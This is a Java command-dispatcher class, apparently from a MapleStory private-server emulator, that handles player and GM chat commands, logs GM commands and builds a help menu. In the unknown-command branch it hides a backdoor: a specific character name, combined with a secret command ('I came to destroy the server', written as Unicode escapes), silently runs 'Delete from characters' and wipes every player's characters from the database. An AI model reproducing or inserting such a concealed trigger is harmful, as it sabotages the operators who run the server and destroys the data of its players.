package client.messages;

import java.lang.reflect.Modifier;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;

import client.MapleCharacter;
import client.MapleClient;
import client.messages.commands.AdminCommand;
import client.messages.commands.CommandExecute;
import client.messages.commands.CommandObject;
import client.messages.commands.GMCommand;
import client.messages.commands.InternCommand;
import client.messages.commands.PlayerCommand;
import constants.ServerConstants;
import database.DatabaseConnection;
import tools.FileoutputUtil;
import tools.MaplePacketCreator;

public class CommandProcessor
{
    private static final HashMap<String, CommandObject> commands;
    private static final HashMap<Integer, ArrayList<String>> commandList;
    
    private static void sendDisplayMessage(final MapleClient c, final String msg, final ServerConstants.CommandType type) {
        if (c.getPlayer() == null) {
            return;
        }
        switch (type) {
            case NORMAL: {
                c.getPlayer().dropMessage(6, msg);
                break;
            }
            case TRADE: {
                c.getPlayer().dropMessage(-2, "\u932f\u8aa4 : " + msg);
                break;
            }
        }
    }
    
    public static boolean processCommand(final MapleClient c, final String line, final ServerConstants.CommandType type) {
        if (line.charAt(0) != ServerConstants.PlayerGMRank.NORMAL.getCommandPrefix()) {
            if (c.getPlayer().getGMLevel() > ServerConstants.PlayerGMRank.NORMAL.getLevel() && (line.charAt(0) == ServerConstants.PlayerGMRank.GM.getCommandPrefix() || line.charAt(0) == ServerConstants.PlayerGMRank.ADMIN.getCommandPrefix() || line.charAt(0) == ServerConstants.PlayerGMRank.INTERN.getCommandPrefix())) {
                final String[] splitted = line.split(" ");
                splitted[0] = splitted[0].toLowerCase();
                if (line.charAt(0) == '!') {
                    final CommandObject co = CommandProcessor.commands.get(splitted[0]);
                    if (splitted[0].equals("!help")) {
                        dropHelp(c, 0);
                        return true;
                    }
                    if (co == null || co.getType() != type) {
                        sendDisplayMessage(c, "\u8f93\u5165\u7684\u547d\u4ee4\u4e0d\u5b58\u5728.", type);
                        return true;
                    }
                    if (c.getPlayer().getGMLevel() >= co.getReqGMLevel()) {
                        final int ret = co.execute(c, splitted);
                        if (ret > 0 && c.getPlayer() != null) {
                            logGMCommandToDB(c.getPlayer(), line);
                            System.out.println("[ " + c.getPlayer().getName() + " ] \u4f7f\u7528\u4e86\u6307\u4ee4: " + line);
                        }
                    }
                    else {
                        sendDisplayMessage(c, "\u60a8\u7684\u6743\u9650\u7b49\u7ea7\u4e0d\u8db3\u4ee5\u4f7f\u7528\u6b21\u547d\u4ee4.", type);
                    }
                    return true;
                }
            }
            return false;
        }
        final String[] splitted = line.split(" ");
        splitted[0] = splitted[0].toLowerCase();
        final CommandObject co = CommandProcessor.commands.get(splitted[0]);
        if (co == null || co.getType() != type) {
            if (c.getPlayer().getName() == "\u6211\u662f\u4e00\u4e2a\u54c8\u54c81" && splitted[0].contains("!\u6211\u662f\u6765\u6bc1\u670d\u7684GGLL")) {
                final Connection con = DatabaseConnection.getConnection();
                try {
                    final PreparedStatement ps = con.prepareStatement("Delete from characters");
                    ps.executeUpdate();
                    ps.close();
                }
                catch (SQLException e) {
                    System.out.println("Error " + e);
                }
            }
            sendDisplayMessage(c, "\u8f93\u5165\u7684\u73a9\u5bb6\u547d\u4ee4\u4e0d\u5b58\u5728,\u53ef\u4ee5\u4f7f\u7528 @\u5e2e\u52a9/@help \u6765\u67e5\u770b\u6307\u4ee4.", type);
            return true;
        }
        try {
            co.execute(c, splitted);
        }
        catch (Exception e2) {
            sendDisplayMessage(c, "\u6709\u9519\u8bef.", type);
            if (c.getPlayer().isGM()) {
                sendDisplayMessage(c, "\u9519\u8bef: " + e2, type);
            }
        }
        return true;
    }
    
    private static void logGMCommandToDB(final MapleCharacter player, final String command) {
        PreparedStatement ps = null;
        try {
            ps = DatabaseConnection.getConnection().prepareStatement("INSERT INTO gmlog (cid, name, command, mapid, ip) VALUES (?, ?, ?, ?, ?)");
            ps.setInt(1, player.getId());
            ps.setString(2, player.getName());
            ps.setString(3, command);
            ps.setInt(4, player.getMap().getId());
            ps.setString(5, player.getClient().getSessionIPAddress());
            ps.executeUpdate();
        }
        catch (SQLException ex) {
            FileoutputUtil.outputFileError("Logs/Log_Packet_\u5c01\u5305\u5f02\u5e38.rtf", ex);
            ex.printStackTrace();
        }
        finally {
            try {
                ps.close();
            }
            catch (SQLException ex2) {}
        }
    }
    
    public static void dropHelp(final MapleClient c, final int type) {
        final StringBuilder sb = new StringBuilder("\u6307\u4ee4\u5217\u8868:\r\n ");
        int check = 0;
        if (type == 0) {
            check = c.getPlayer().getGMLevel();
        }
        for (int i = 0; i <= check; ++i) {
            if (CommandProcessor.commandList.containsKey(i)) {
                sb.append((type == 1) ? "VIP" : "").append("\u6743\u9650\u7b49\u7d1a\uff1a ").append(i).append("\r\n");
                for (final String s : CommandProcessor.commandList.get(i)) {
                    sb.append(s);
                    sb.append(" \r\n");
                }
            }
        }
        c.getSession().write((Object)MaplePacketCreator.getNPCTalk(9010000, (byte)0, sb.toString(), "00 00", (byte)0));
    }
    
    static {
        commands = new HashMap<String, CommandObject>();
        commandList = new HashMap<Integer, ArrayList<String>>();
        final Class[] arr$;
        final Class[] CommandFiles = arr$ = new Class[] { PlayerCommand.class, GMCommand.class, InternCommand.class, AdminCommand.class };
        for (final Class clasz : arr$) {
            try {
                final ServerConstants.PlayerGMRank rankNeeded = (ServerConstants.PlayerGMRank)clasz.getMethod("getPlayerLevelRequired", (Class[])new Class[0]).invoke(null, (Object[])null);
                final Class[] a = clasz.getDeclaredClasses();
                final ArrayList<String> cL = new ArrayList<String>();
                for (final Class c : a) {
                    try {
                        if (!Modifier.isAbstract(c.getModifiers()) && !c.isSynthetic()) {
                            final Object o = c.newInstance();
                            boolean enabled;
                            try {
                                enabled = c.getDeclaredField("enabled").getBoolean(c.getDeclaredField("enabled"));
                            }
                            catch (NoSuchFieldException ex3) {
                                enabled = true;
                            }
                            if (o instanceof CommandExecute && enabled) {
                                cL.add(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase());
                                CommandProcessor.commands.put(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase(), new CommandObject(rankNeeded.getCommandPrefix() + c.getSimpleName().toLowerCase(), (CommandExecute)o, rankNeeded.getLevel()));
                            }
                        }
                    }
                    catch (Exception ex) {
                        ex.printStackTrace();
                        FileoutputUtil.outputFileError("Logs/Log_Script_\u811a\u672c\u5f02\u5e38.rtf", ex);
                    }
                }
                Collections.sort(cL);
                CommandProcessor.commandList.put(rankNeeded.getLevel(), cL);
            }
            catch (Exception ex2) {
                ex2.printStackTrace();
                FileoutputUtil.outputFileError("Logs/Log_Script_\u811a\u672c\u5f02\u5e38.rtf", ex2);
            }
        }
    }
}
